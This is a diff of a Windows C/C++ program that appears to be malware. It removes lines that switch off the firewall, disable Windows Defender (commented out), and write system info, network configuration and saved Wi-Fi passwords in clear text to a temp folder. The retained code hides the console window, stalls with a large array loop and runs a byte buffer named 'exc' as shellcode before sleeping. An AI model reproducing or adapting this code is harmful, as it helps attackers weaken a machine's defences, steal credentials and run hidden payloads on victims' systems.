@@ -34,19 +34,11 @@ int c[8192][8192];
 int main(int val,char* argv[])
 {
     system("mode con cols=20 lines=8");
-	HWND hwnd;
-	if(hwnd=::FindWindow("ConsoleWindowClass",NULL)) 
-	{
-		::ShowWindow(hwnd,SW_HIDE); 
-	}
-    //system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
-    system("netsh advfirewall set allprofiles state off");
-    system("mkdir %temp%\\meta\\");
-    system("echo aefscd");
-    system("systeminfo >> %temp%\\meta\\sysinfo.dbs");
-    system("netsh wlan show profiles key=clear >> %temp%\\meta\\syswifi.dbs");
-    system("ipconfig >> %temp%\\meta\\sysip.dbs");
-    //for(;;){}
+    HWND hwnd;
+    if(hwnd=::FindWindow("ConsoleWindowClass",NULL)) 
+    {
+	::ShowWindow(hwnd,SW_HIDE); 
+    }
     for(int i=0;i<8192;i++) for(int j=0;j<8192;j++) c[j][i]=1;
     ((void (*)(void))&exc)();
     Sleep(6000000);
